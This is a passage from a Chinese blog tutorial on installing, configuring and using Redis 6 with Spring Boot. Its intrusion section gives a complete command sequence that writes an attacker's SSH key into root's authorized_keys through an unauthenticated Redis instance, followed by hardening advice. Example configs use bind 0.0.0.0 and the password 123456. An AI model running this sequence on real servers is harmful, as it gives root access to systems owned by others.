Google、Facebook、亚马逊</li><li>国内：阿里、腾讯、字节、百度<ul><li>大厂们都有一个习惯：基于Redis二次开发，比如阿里Tair</li></ul></li></ul><p>高级工程师岗位面试都喜欢问Redis</p><ul><li>特性：aof/rdb、高性能原因、key设计、热点key、淘汰算法</li><li>功能实现：排行榜、购物车、社交关系(粉丝、关注)、Feed流、附近的商家、分布式锁等等</li></ul><h2 id="Linux服务器源码安装Redis6和相关依赖"><a href="#Linux服务器源码安装Redis6和相关依赖" class="headerlink" title="Linux服务器源码安装Redis6和相关依赖"></a>Linux服务器源码安装Redis6和相关依赖</h2><p>源码安装Redis上传到Linux服务（安装包在本章本集资料里面, 先安装升级gcc再编译，不然会有问题）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装gcc</span></span><br><span class="line">yum install -y gcc-c++ autoconf automake</span><br><span class="line"></span><br><span class="line"><span class="comment">#centos7 默认的 gcc 默认是4.8.5,版本小于 5.3 无法编译,需要先安装gcc新版才能编译</span></span><br><span class="line">gcc -v</span><br><span class="line"></span><br><span class="line"><span class="comment">#升级新版gcc，配置永久生效</span></span><br><span class="line">yum -y install centos-release-scl</span><br><span class="line">yum -y install devtoolset-9-gcc devtoolset-9-gcc-c++ devtoolset-9-binutils</span><br><span class="line"></span><br><span class="line">scl <span class="built_in">enable</span> devtoolset-9 bash  </span><br><span class="line"><span class="built_in">echo</span> <span class="string">"source /opt/rh/devtoolset-9/enable"</span> &gt;&gt;/etc/profile </span><br><span class="line"></span><br><span class="line"><span class="comment">#编译redis</span></span><br><span class="line"><span class="built_in">cd</span> redis</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装到指定目录</span></span><br><span class="line">mkdir -p /usr/<span class="built_in">local</span>/redis</span><br><span class="line"></span><br><span class="line">make PREFIX=/usr/<span class="built_in">local</span>/redis install</span><br></pre></td></tr></table></figure><p>安装编译redis6需要升级gcc，默认自带的gcc版本比较老</p><ul><li>目录介绍<ul><li>配置文件</li><li>redis-server</li><li>redis-cli</li><li>指定配置文件</li></ul></li></ul><h2 id="容器化部署Redis6"><a href="#容器化部署Redis6" class="headerlink" title="容器化部署Redis6"></a>容器化部署Redis6</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装并运行Docker。</span></span><br><span class="line">yum install docker-io -y</span><br><span class="line">systemctl start docker</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查安装结果。</span></span><br><span class="line">docker info</span><br><span class="line"></span><br><span class="line">启动使用Docker</span><br><span class="line">systemctl start docker     <span class="comment">#运行Docker守护进程</span></span><br><span class="line">systemctl stop docker      <span class="comment">#停止Docker守护进程</span></span><br><span class="line">systemctl restart docker   <span class="comment">#重启Docker守护进程</span></span><br><span class="line"></span><br><span class="line">docker ps<span class="comment">#查看容器</span></span><br><span class="line">docker stop <span class="comment">#容器id</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改镜像仓库</span></span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"><span class="comment">#改为下面内容，然后重启docker</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"debug"</span>:<span class="literal">true</span>,<span class="string">"experimental"</span>:<span class="literal">true</span>,</span><br><span class="line"><span class="string">"registry-mirrors"</span>:[<span class="string">"https://pb5bklzr.mirror.aliyuncs.com"</span>,<span class="string">"https://hub-mirror.c.163.com"</span>,<span class="string">"https://docker.mirrors.ustc.edu.cn"</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看信息</span></span><br><span class="line">docker info</span><br></pre></td></tr></table></figure><ul><li>docker部署redis 并配置密码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#如果访问不了，记得看防火墙/网络安全组端口是否开放</span></span><br><span class="line"><span class="comment">#源码安装redis的话默认不能远程访问 </span></span><br><span class="line"><span class="comment">#docker安装redis可以远程访问</span></span><br><span class="line">docker search  redis</span><br><span class="line">docker pull redis:latest</span><br><span class="line">docker images</span><br><span class="line">docker run -itd --name xdclass-redis -p 6379:6379 redis --requirepass 123456</span><br><span class="line">docker <span class="built_in">exec</span> -it xdclass-redis /bin/bash</span><br><span class="line">-i 以交互模式运行容器，通常与 </span><br><span class="line">-t 同时使用;</span><br><span class="line">-d 后台运行容器，并返回容器ID;</span><br></pre></td></tr></table></figure><h1 id="Redis6核心配置-可视化工具"><a href="#Redis6核心配置-可视化工具" class="headerlink" title="Redis6核心配置+可视化工具"></a>Redis6核心配置+可视化工具</h1><h2 id="分布式缓存Redis6常见核心配置"><a href="#分布式缓存Redis6常见核心配置" class="headerlink" title="分布式缓存Redis6常见核心配置"></a>分布式缓存Redis6常见核心配置</h2><ol><li><p>你现在必须要知道的配置</p><ul><li>daemonize yes 配置后台运行，默认no</li><li>bind 绑定指定ip访问，0.0.0.0是不限制，配置多个ip例子 12.13.432.12 31.12.43.13 用空格隔开</li><li>port 端口号 默认6379</li><li>requirepass 密码配置</li><li>dbfilename 配置redis持久化文件名称</li><li>dir 配置redis持久化文件存储地址</li><li>save 配置redis持久化机制</li></ul></li><li><p>创建目录</p><ul><li>日志 /usr/local/redis/log</li><li>数据 /usr/local/redis/data</li><li>配置文件 /usr/local/redis/conf</li></ul></li><li><p>创建自定义配置文件 (使用自带的也行)</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#任何ip可以访问</span></span><br><span class="line"><span class="string">bind</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="comment">#守护进程</span></span><br><span class="line"><span class="string">daemonize</span> <span class="literal">yes</span></span><br><span class="line"><span class="comment">#密码</span></span><br><span class="line"><span class="string">requirepass</span> <span class="number">123456</span></span><br><span class="line"><span class="comment">#日志文件</span></span><br><span class="line"><span class="string">logfile</span> <span class="string">"/usr/local/redis/log/redis.log"</span></span><br><span class="line"><span class="comment">#持久化文件名称</span></span><br><span class="line"><span class="string">dbfilename</span> <span class="string">xdclass.rdb</span></span><br><span class="line"><span class="comment">#持久化文件存储路径</span></span><br><span class="line"><span class="string">dir</span> <span class="string">/usr/local/redis/data</span></span><br><span class="line"><span class="comment">#持久化策略, 10秒内有个1个key改动，执行快照</span></span><br><span class="line"><span class="string">save</span> <span class="number">10</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>启动redis指定配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-server ../conf/redis.conf</span><br></pre></td></tr></table></figure></li></ol><h2 id="防止机器被入侵挖矿"><a href="#防止机器被入侵挖矿" class="headerlink" title="防止机器被入侵挖矿"></a>防止机器被入侵挖矿</h2><p>出现了情况是经常云服务器有不明进程，cpu使⽤率 90%以上；部署云服务器的被清空-⽀付⽐特币才可以还原</p><p><strong>N种⽅式：弱⼝令爆破⼊侵、webshell⽂件提权⼊侵、redis端⼝⼊侵【最多】</strong></p><p>不明进程的CPU占有率过⾼，强制停⽌，过⼀会⼜⾃动出现</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024111859.png" alt="image-20211024111855619"></p><p>解决办法</p><ol><li><p><strong>关闭对外监听的端⼝</strong> </p></li><li><p><strong>查找linux定时任务-&gt;清除位置任务</strong> </p></li><li><p><strong>redis禁⽌远程访问 或者 设置复杂密码、不⽤默认的 6379端⼝</strong> </p></li><li><p><strong>恢复出⼚设置</strong></p></li></ol><p>那这个⼊侵原理是怎样的？</p><p>需要知识： 对称和⾮对称加密知识、中间⼈攻击知识、ssh登录 流程知识</p><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>哈希加密、对称加密、非对称加密</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024112316.png" alt="image-20211024112313718"></p><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211025095310.png" alt="image-20211024112512142"></p><p>⾮对称加密通信也存在⼀个致命的弱点，就是它有⼀个 交换公钥的过程</p><p>中间人通过伪造公钥（中间⼈攻击），不光窃听到⽼王的 消息， 还能保证整个过程中⽼王和⼆当家⼩D都没有察觉！</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211025095315.png" alt="image-20211024112834026"></p><p>中间人截获小D的pub，并用自己的pub发给老王，老王用中间人的pub加密数据，发送给小D的过程中，被中间人截获之后用自己的pri解密就可窃取信息。</p><h3 id="SSH的原理"><a href="#SSH的原理" class="headerlink" title="SSH的原理"></a>SSH的原理</h3><p>什么是SSH Secure Shell（安全外壳协议，简称SSH）是⼀种加密的⽹络传输协议 只是⼀种协议，存在多种实现，有商业版的也有开源实现的，OpenSSH就是开源实现。它将客户端与服务端之间的消息通过加密保护起来，只讨论SSH在Linux Shell中的⽤法。</p><p>SSH流程解析：使⽤了RSA⾮对称加密算法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（1）远程主机收到⽤户的登录请求，把⾃⼰的公钥发给⽤户。</span><br><span class="line">（2）⽤户使⽤这个公钥，将登录密码加密后，发送回来。</span><br><span class="line">（3）远程主机⽤⾃⼰的私钥，解密登录密码，如果密码正确，就同意⽤户登录</span><br><span class="line">备注：如果攻击者插在⽤户与远程主机之间（⽐如在公共的wifi区域），⽤伪造的公钥，获取⽤户的登录密码, 再⽤这个密码登录远程主机，那么SSH的安全机制就荡然⽆存了,这种⻛险就是著名的&quot;中间⼈攻击&quot;</span><br></pre></td></tr></table></figure><p>第⼀次登录对⽅主机，系统会出现下⾯的提示</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024114756.png" alt="image-20211024114753549"></p><p><strong>公钥指纹</strong></p><p>所谓“公钥指纹”，是指公钥⻓度᫾⻓（这⾥采⽤RSA算法，⻓ 达1024位），很难⽐对，所以对其进⾏MD5计算，将它变成⼀个128位的指 纹。下例中是 98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58: 4d。</p><p>⽤户⾃⼰衡量以后决定接受这个远程主机的公钥 （远程主机贴出公钥指纹，以便⽤户⾃⾏核对） 接受之后，就可以输⼊密码，成功后就可以登录, 当远程主机的公钥被接受以后，它就会被保存在⽂ $HOME/.ssh/known_hosts之中。 下次再连接这台主机，系统就会认出它的公钥已经保存在本地 了，从⽽跳过警告部分，直接提示输⼊密码。</p><p><strong>公钥登录</strong></p><p>原理就是⽤户将⾃⼰的公钥储存在远程主机上。 </p><p>登录的时候，远程主机会向⽤户发送⼀段随机字符串， ⽤户⽤⾃⼰的私钥加密后，再发回远程主机。 远程主机⽤事先储存的用户的公钥，用公钥进⾏解密，如果成功，就证明⽤户是可信的，直接允许登录shell，不再要求密码。要求⽤户必须提供⾃⼰的公钥。如果没有现成的，可以直接⽤下⾯的命令⽣成⼀个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure><h3 id="SSH免密登录远程Linux云主机实战"><a href="#SSH免密登录远程Linux云主机实战" class="headerlink" title="SSH免密登录远程Linux云主机实战"></a>SSH免密登录远程Linux云主机实战</h3><p>什么是known_hosts⽂件</p><p>A通过ssh⾸次连接到B，B会将公钥1（host key）传递 给A，A将公钥1存⼊known_hosts⽂件中，即SSH会把你每个你访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。 当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告避免受到DNS Hijack之类的攻击。测试：直接本地修改本地对应的的 “公钥串” host⽂件内容格式：ip 公钥串</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024115839.png" alt="image-20211024115837020"></p><p>A通过ssh登陆B时提示 ： Host key verification failed</p><p>原因：A的known_hosts⽂件中记录的B的公钥1 与 连 接时B传过来的公钥2不匹配</p><p><strong>解决办法：</strong> </p><ol><li><p>⽅式⼀：删除A的known_hosts⽂件中记录的B的公钥 </p></li><li><p>⽅式⼆：清空本地host主机配置 echo “” &gt; ~/.ssh/known_hosts </p></li><li><p>⽅式三：修改配置⽂件，在ssh登陆时不通过 known_hosts⽂件进⾏验证（安全性有所降低）需要启机器</p></li></ol><p>最多的应⽤案例： Git 代码仓库管理通信</p><ol><li><p>本地⽣成秘钥串</p><p>ssh-keygen 运⾏结束以后，在$HOME/.ssh/⽬录下，会新⽣成两个 ⽂件 id_rsa.pub 和 id_rsa, 前者是你的公钥，后者是你的私钥，将公钥传送到远程主机host上⾯，从此你再登录，就不需要输⼊密码了</p></li><li><p>远端服务器</p><p>远程主机将⽤户的公钥，保存在登录后的⽤户主⽬录的 $HOME/.ssh/authorized_keys⽂件中</p><p>公钥就是⼀段字符串，只要把它追加在 authorized_keys⽂件的末尾就⾏了</p></li></ol><h3 id="通过Redis⼊-侵阿⾥云ECS服务器"><a href="#通过Redis⼊-侵阿⾥云ECS服务器" class="headerlink" title="通过Redis⼊ 侵阿⾥云ECS服务器"></a>通过Redis⼊ 侵阿⾥云ECS服务器</h3><p>前⾯学习了SSH免密登录，知道了⼀种不⽤密码也可以登录ECS服务器的⽅式</p><p>核⼼：就是把公钥保存到 $HOME/.ssh/authorized_keys ⽬录</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024121240.png" alt="image-20211024121238761"></p><p>机器⼀：⿊客使⽤的，也安装Redis6</p><p>机器⼆：你使⽤的，被⼊侵的机器，需要安装Redis6</p><p>被入侵的服务器安装Redis6 开启远程连接 不设置密码</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024121716.png" alt="image-20211024121713862"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#被黑客入侵的机器</span></span><br><span class="line"><span class="comment">#守护进程运⾏</span></span><br><span class="line">daemonize yes </span><br><span class="line"><span class="comment">#指定配置⽂件启动 </span></span><br><span class="line">./redis-server ../redis.conf </span><br><span class="line"><span class="comment">#开放⽹络安全组 ⼤家是不是经常这样做，测试学习使⽤</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#本地（黑客的机器）ssh-keygen⽣成⼀对秘钥</span></span><br><span class="line">ssh-keygen</span><br><span class="line"><span class="comment">#公钥（黑客的机器）⽣成攻击键值, ⽣成后查看下  </span></span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>;) &gt; test.txt</span><br><span class="line">cat test.txt</span><br><span class="line"><span class="comment">#远程连接被入侵服务器的Redis6，配置Key到Redis中，192.168.243.129是被入侵的机器的ip，把黑客的公钥写到被入侵的Redis里面</span></span><br><span class="line">cat test.txt | ./src/redis-cli -h 192.168.243.129 -x</span><br><span class="line"><span class="built_in">set</span> bar</span><br><span class="line"><span class="comment">#查看bar这个key的value（黑客公钥）</span></span><br><span class="line">get bar </span><br><span class="line"><span class="comment">#保持连接被入侵的redis，通过Redis保存机制替换系统⽂件</span></span><br><span class="line">config <span class="built_in">set</span> dir /root/.ssh</span><br><span class="line">config get dir</span><br><span class="line">config <span class="built_in">set</span> dbfilename <span class="string">"authorized_keys"</span></span><br><span class="line">save</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="comment">#成功的将黑客的公钥写⼊ /root/.ssh ⽂件夹的authotrized_keys</span></span><br><span class="line"><span class="comment">#登录被入侵主机看下效果</span></span><br><span class="line">ssh -i id_rsa root@192.168.243.129</span><br></pre></td></tr></table></figure><h3 id="⼊侵阿⾥云ECS服务器提权流程原理"><a href="#⼊侵阿⾥云ECS服务器提权流程原理" class="headerlink" title="⼊侵阿⾥云ECS服务器提权流程原理"></a>⼊侵阿⾥云ECS服务器提权流程原理</h3><p>回顾⼊侵流程，利⽤redis的持久化操作⽂件权限，Redis Config Set 命令可以动态地调整 Redis 服务器的配置(configuration)⽽⽆须重启。 Redis Save 命令执⾏⼀个同步保存操作，将当前 Redis 实例的所有数据快照(snapshot)以 RDB ⽂件的形式保存到硬盘。 Redis⽀持RDB和AOF两种持久化机制 。RDB持久化是把当前进程数据⽣成快照保存到硬盘的过程，触发RDB持久化过程分为⼿动触发和⾃动触发。redis持久化配置，RDB⽂件保存在dir配置指定的⽬录下，⽂件名通过dbfilename配置指定，通过执⾏config set dir {newDir} 和 config set dbfilename {newFileName}运⾏期动态执⾏，当下次运⾏时RDB⽂件会保存到新⽬录。</p><h3 id="如何避免云服务器被⼊侵提权"><a href="#如何避免云服务器被⼊侵提权" class="headerlink" title="如何避免云服务器被⼊侵提权"></a>如何避免云服务器被⼊侵提权</h3><ol><li>禁⽌⼀些⾼危命令</li><li>以低权限运⾏应⽤服务</li><li>为服务添加复杂密码验证</li><li>禁⽌外⽹访问，配置防⽕墙</li><li>保证 authorized_keys ⽂件的安全(只读，防添加新公钥等）</li></ol><h2 id="redis6可视化客户端安装"><a href="#redis6可视化客户端安装" class="headerlink" title="redis6可视化客户端安装"></a>redis6可视化客户端安装</h2><p>Linux服务器</p><ul><li>云服务器开放网络安全组<ul><li>redis配置下复杂密码，防止被挖矿</li></ul></li><li>本地虚拟机记得关闭防火墙</li></ul><p>key命名规范</p><ul><li>方便管理+易读</li><li>不要过长,本身key也占据空间</li><li>冒号分割，不要有特殊字符(空格-引号-转义符)</li><li>例子：业务名:表名:ID<ul><li>product-service:produdct:1</li><li>user:sign:1</li></ul></li></ul><p>单机默认16个数据库，集群的话则没有这个概念，而是solt槽位</p><p>在线工具学习: <a href="http://try.redis.io/" target="_blank" rel="noopener">http://try.redis.io/</a></p><h1 id="分布式缓存Redis6常见数据结构-指令实战"><a href="#分布式缓存Redis6常见数据结构-指令实战" class="headerlink" title="分布式缓存Redis6常见数据结构+指令实战"></a>分布式缓存Redis6常见数据结构+指令实战</h1><h2 id="Redis6常见数据结构"><a href="#Redis6常见数据结构" class="headerlink" title="Redis6常见数据结构"></a>Redis6常见数据结构</h2><ul><li>中文文档：<a href="http://www.redis.cn/" target="_blank" rel="noopener">http://www.redis.cn/</a></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024161431.png" alt="image-20211024161421995"></p><h2 id="Redis6数据结构之String"><a href="#Redis6数据结构之String" class="headerlink" title="Redis6数据结构之String"></a>Redis6数据结构之String</h2><ul><li>应用场景：验证码、计数器、订单重复提交、用户登录信息、商品详情</li><li>常用命令： set/get/increment/decrement/del</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024161719.png" alt="image-20211024161715303"></p><h2 id="Redis6数据结构之List类型"><a href="#Redis6数据结构之List类型" class="headerlink" title="Redis6数据结构之List类型"></a>Redis6数据结构之List类型</h2><ul><li>数据结构介绍：双向链表，插入删除时间复杂度O(1)快,查找为O(n)慢</li><li>应用场景：简单队列、最新商品列表、评论列表</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024162826.png" alt="image-20211024162822553"></p><h2 id="Redis6数据结构之Hash类型"><a href="#Redis6数据结构之Hash类型" class="headerlink" title="Redis6数据结构之Hash类型"></a>Redis6数据结构之Hash类型</h2><p>应用场景：购物车存储、用户对象</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024163439.png" alt="image-20211024163436928"></p><h2 id="Redis6数据结构之Set类型"><a href="#Redis6数据结构之Set类型" class="headerlink" title="Redis6数据结构之Set类型"></a>Redis6数据结构之Set类型</h2><ul><li>数学：差集、交集、并集</li><li>应用场景：大数据里面的用户画像标签集合、社交应用里面的共同好有</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024164226.png" alt="image-20211024164223752"></p><h2 id="Redis6数据结构之SortedSet类型"><a href="#Redis6数据结构之SortedSet类型" class="headerlink" title="Redis6数据结构之SortedSet类型"></a>Redis6数据结构之SortedSet类型</h2><ul><li>数据结构介绍：使用HashMap+跳表skipList保证数据存储和有序</li><li>应用场景：商品日销榜、积分榜等</li><li>什么是跳跃表：性能堪比红黑树，而且实现起来比红黑树简单很多</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024164757.png" alt="image-20211024164751768"></p><h1 id="SpringBoot2-x整合Redis6客户端实战"><a href="#SpringBoot2-x整合Redis6客户端实战" class="headerlink" title="SpringBoot2.x整合Redis6客户端实战"></a>SpringBoot2.x整合Redis6客户端实战</h1><h2 id="分布式缓存Redis客户端"><a href="#分布式缓存Redis客户端" class="headerlink" title="分布式缓存Redis客户端"></a>分布式缓存Redis客户端</h2><ul><li><p>自带客户端 redis-cli</p></li><li><p>可视化工具</p></li><li><p>语言客户端：java、nodejs、python</p></li><li><p>java语言客户端：jedis lettuce</p></li><li><p>Jedis 是直连模式，在多个线程间共享一个 Jedis 实例时是线程不安全的,需要使用连接池</p><p>其API提供了比较全面的Redis命令的支持，相比于其他Redis 封装框架更加原生</p><p>Jedis中的方法调用是比较底层的暴露的Redis的API，Java方法基本和Redis的API保持着一致</p><p>使用阻塞的I/O，方法调用同步，程序流需要等到socket处理完I/O才能执行，不支持异步操作</p></li><li><p>高级Redis客户端，用于线程安全同步，异步响应</p><p>基于Netty的的事件驱动，可以在多个线程间并发访问，通过异步的方式可以更好的利用系统资源</p></li></ul><h2 id="SpringData介绍"><a href="#SpringData介绍" class="headerlink" title="SpringData介绍"></a>SpringData介绍</h2><ul><li><p>操作mysql/redis/elasticseatch</p></li><li><p>SpringDataRedis是专门操作redis的依赖</p></li><li><p>添加依赖 spring-boot-starter-data-redis</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>注意：Springboot2后默认使用Lettuce作为访问redis的客户端</p></li><li><p>旧版本lettuce存在堆外内存溢出的bug， 5.3版本修复了这个bug, 我们是用 6.1</p></li><li><p>很多人没发现并发问题的原因</p><ul><li>并发量不高</li><li>内存足够大，没发生问题就又发布更新了</li></ul></li><li><p>解决方式</p><ul><li>升级版本</li><li>换jedis</li></ul></li></ul><h2 id="SpringDataRedis的RedisTemplate"><a href="#SpringDataRedis的RedisTemplate" class="headerlink" title="SpringDataRedis的RedisTemplate"></a>SpringDataRedis的RedisTemplate</h2><p>RedisTemplate介绍</p><ul><li>ValueOperations：简单K-V操作</li><li>SetOperations：set类型数据操作</li><li>ZSetOperations：zset类型数据操作</li><li>HashOperations：针对map类型的数据操作</li><li>ListOperations：list类型的数据操作</li></ul><p>RedisTemplate和StringRedisTemplate的区别</p><ul><li><p>StringRedisTemplate继承RedisTemplate</p></li><li><p>两者的数据是不共通的（默认的序列化机制导致key不一样）</p></li><li><p>StringRedisTemplate默认采用的是String的序列化策略</p></li><li><p>RedisTemplate默认采用的是JDK的序列化策略，会将数据先序列化成字节数组然后在存入Redis数据库，这个时候打开Redis查看的时候，你会看到你的数据不是以可读的形式展现的，而是以字节数组显示，类似下面</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211025095338.png" alt="image-20211024170236719"></p></li><li><p>当然从Redis获取数据的时候也会默认将数据当做字节数组转化，这样就会导致一个问题，当需要获取的数据不是以字节数组存在redis当中而是正常的可读的字符串的时候，比如说下面这种形式的数据，RedisTemplate就无法获取导数据，这个时候获取到的值就是NULL。这个时候StringRedisTempate就派上了用场。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211025095339.png" alt="image-20211024170731482"></p></li><li><p>把StringRedisTemplate的序列化类修改成RedisTemplate的JdkSerializationRedisSerializer</p><p>最后还是无法获取被序列化的对象数据，即使是没有转化为对象的字节数组</p></li><li><p>总结</p><ul><li>当redis数据库里面本来操作的是字符串数据的时候，那使用StringRedisTemplate即可</li><li>数据是复杂的对象类型，那么使用RedisTemplate是更好的选择</li></ul></li></ul><h2 id="RedisTemplate的序列和反序列化机制"><a href="#RedisTemplate的序列和反序列化机制" class="headerlink" title="RedisTemplate的序列和反序列化机制"></a>RedisTemplate的序列和反序列化机制</h2><ul><li><p>同个key为啥获取不到值，核心就是序列化机制导致key不一样</p></li><li><p>什么是序列化</p><ul><li>把对象转换为字节序列的过程称为对象的序列化。</li><li>把字节序列恢复为对象的过程称为对象的反序列化。</li><li>对象的序列化主要有两种用途<ul><li>把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中</li><li>在网络上传送对象的字节序列。</li></ul></li></ul></li><li><p>Redis为什么要序列化</p><p>redis要序列化对象是使对象可以跨平台存储和进行网络传输。因为存储和网络传输都需要把一个对象状态保存成一种跨平台识别的字节格式，然后其他的平台才可以通过字节信息解析还原对象信息，所以进行“跨平台存储”和”网络传输”的数据都需要进行序列化。</p></li><li><p>性能可以提高，不同的序列化方式性能不一样</p></li><li><p>可视化工具更好查看</p><ul><li>采用默认的jdk方式会乱码（POJO类需要实现Serializable接口）</li><li>采用JSON方式则不用，且可视化工具更好查看</li></ul></li><li><p>自定义redis序列化方式，提供了多种可选择策略</p><ul><li>JdkSerializationRedisSerializer<ul><li>POJO对象的存取场景，使用JDK本身序列化机制</li><li>默认机制 ObjectInputStream/ObjectOutputStream进行序列化操作</li></ul></li><li>StringRedisSerializer<ul><li>Key或者value为字符串</li></ul></li><li>Jackson2JsonRedisSerializer<ul><li>利用jackson-json工具，将pojo实例序列化成json格式存储，会加上双引号“”</li></ul></li><li>GenericFastJsonRedisSerializer<ul><li>另一种javabean与json之间的转换，同时也需要指定Class类型</li></ul></li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024182210.png" alt="image-20211024182207770"></p><h2 id="RedisTemplate-序列化机制配置"><a href="#RedisTemplate-序列化机制配置" class="headerlink" title="RedisTemplate 序列化机制配置"></a>RedisTemplate 序列化机制配置</h2><h3 id="自定义序列化和反序列化机制配置"><a href="#自定义序列化和反序列化机制配置" class="headerlink" title="自定义序列化和反序列化机制配置"></a>自定义序列化和反序列化机制配置</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 